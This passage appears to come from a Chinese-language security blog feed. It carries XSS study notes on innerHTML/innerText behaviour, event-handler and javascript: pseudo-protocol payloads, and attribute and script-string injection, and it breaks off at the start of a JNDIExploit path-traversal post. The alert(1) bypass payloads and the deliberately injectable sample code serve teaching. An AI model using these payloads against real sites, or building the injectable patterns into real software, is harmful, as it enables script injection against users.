class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>是无法执行的，innerHTML禁止了script标签<br>这时候可以用img标签onerror属性去绕过<br>也可以用iframe标签的srcdoc去绕过<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"><span class="comment">//当然下面这种也是可以的</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>属性中的内容是可以经过编码的<br>之前sekaictf拿到golf jail我就以为有了编码就不可能存在xss了</p><h3 id="innerText"><a href="#innerText" class="headerlink" title="innerText"></a>innerText</h3><p>接下来看看innerText<br>还是一样的代码，只不过改成innerText<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerText</span> = <span class="string">&#x27;&lt;iframe&lt;?php echo ($_GET[&#x27;</span>name<span class="string">&#x27;]) ?&gt;&gt;&lt;/iframe&gt;&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>可以看到他将你输入的尖括号之类的特殊字符都进行了html编码，那么就不会在存在xss漏洞了<br>但是有一点比较奇怪，当你从innerText中取东西，比如下面的代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">123</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerText</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>虽然<code>&lt;a&gt;</code>中的内容经过了编码，但是显示却是下面的内容<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>所以就会有一种情况，当年输入的内容被编码了，但是如果有以下的代码，就有可能会被绕过<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">123</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span><span class="symbol">&amp;lt;</span>img src=1 onerror=alert(1)<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerHTML</span> = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerText</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>为什么不用<code>&lt;script&gt;</code>标签，上面提过innerHTML是不会去执行script标签下的代码的</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;以前一直以为经过htmlspecialchars之后就不存在xss漏洞了，现在想来还是我太肤浅了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10315118&quot;&gt;https://ithelp.ithome.com.tw/articles/10315118&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>前端安全2-基础xss（笔记）</title>
    <link href="http://example.com/2023/09/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A82-%E5%9F%BA%E7%A1%80xss%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A82-%E5%9F%BA%E7%A1%80xss%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-20T09:18:25.000Z</published>
    <updated>2023-09-23T16:23:56.392Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>聊一下基础的xss，等着huli大佬写奇淫技巧</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10314883">https://ithelp.ithome.com.tw/articles/10314883</a><span id="more"></span></li></ul><h2 id="触发js代码"><a href="#触发js代码" class="headerlink" title="触发js代码"></a>触发js代码</h2><p>一般来说是用script标签去触发的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>但是除了script标签，还可以用inline event handler来进行触发<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;not_exist&quot;</span> onerror=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml">&lt;svg/onload=alert(1)&gt;</span></span><br></pre></td></tr></table></figure><br>常见的用来触发event handler的有</p><ul><li>onerror</li><li>onload</li><li>onfocus</li><li>onblur</li><li>onanimationend</li><li>onclick</li><li>onmouseenter</li></ul><p>等等</p><p>当然还可以用伪协议去触发js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="title class_">Link</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure><br>这里有个值得注意的点，可以把href后面的伪协议当做字符串，这时候如果用了html编码也可以触发js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&amp;#x6a;<span class="attr">avascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="title class_">Link</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>在这个网站有更多的payload<br><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p><h2 id="不同的xss"><a href="#不同的xss" class="headerlink" title="不同的xss"></a>不同的xss</h2><h3 id="注入html"><a href="#注入html" class="headerlink" title="注入html"></a>注入html</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Hello, &lt;h1&gt;&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这种就直接htmlspecialchar就可以过滤了，比较常见不多赘述了</p><h3 id="注入属性"><a href="#注入属性" class="headerlink" title="注入属性"></a>注入属性</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;content&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> qs = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> clazz = qs.<span class="title function_">get</span>(<span class="string">&#x27;clazz&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#content&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">    &lt;div class=&quot;<span class="subst">$&#123;clazz&#125;</span>&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">      Demo</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">    &lt;/div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">  `</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这段代码会获取get参数的clazz，并拼接到<code>&lt;div class=&quot;&quot;&gt;</code>中</p><p>那么注入xss的方式有几种</p><p>第一种闭合div，增加一个标签<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;img src=not_exist onerror=alert(1)&gt;</span></span><br></pre></td></tr></table></figure><br>那么代码就会变为<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">not_exist</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span></span><br><span class="line"><span class="language-xml">  Demo</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>第二种闭合”然后增加属性<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; tabindex=1 onfocus=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot; x=&quot;</span></span><br></pre></td></tr></table></figure><br>那么就会变成<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;&quot;</span> tabindex=<span class="number">1</span> onfocus=<span class="string">&quot;alert(1)&quot;</span> x=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">  <span class="title class_">Demo</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><h3 id="注入到js中"><a href="#注入到js中" class="headerlink" title="注入到js中"></a>注入到js中</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">name</span> = `<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="meta">?&gt;</span>`;</span><br><span class="line">  <span class="title function_ invoke__">alert</span>(name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当代码是这样的时候<br><code>?name=$&#123;alert(1)&#125;</code>可以用这种语句去注入js</p><p>如果是用双引号的形式，如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">name</span> = <span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$_GET</span>[&#x27;name&#x27;]) ?&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">alert</span>(name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>这样可能就没法进行注入js了，但是如果没有htmlspecialchars过滤的话，就可以用闭合<code>&quot;</code>或者闭合<code>&lt;script&gt;</code>标签进行注入,在注入其他标签<br>例如<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">&quot;;alert(1);&quot;</span></span><br><span class="line">name=&lt;/script&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;聊一下基础的xss，等着huli大佬写奇淫技巧&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10314883&quot;&gt;https://ithelp.ithome.com.tw/articles/10314883&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>IELTS learning by chatgpt</title>
    <link href="http://example.com/2023/09/17/IELTS-learning-by-chatgpt/"/>
    <id>http://example.com/2023/09/17/IELTS-learning-by-chatgpt/</id>
    <published>2023-09-17T08:59:37.000Z</published>
    <updated>2023-09-17T08:59:37.285Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>JNDIExploit路径穿越漏洞</title>
    <link href="http://example.com/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-09-16T07:34:23.000Z</published>
    <updated>2023-09-16T08:10:39.221Z</updated>
    
    <content type="html"><![CDATA[<h2 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h2><span id="more"></span><p>该工具启动命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 0.0.0.0</span><br></pre></td></tr></table></figure><br>默认会启动http服务器<br>该工具http服务器相应的代码位于项目<br><code>src/main/java/com/feihong/ldap/HTTPServer.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span 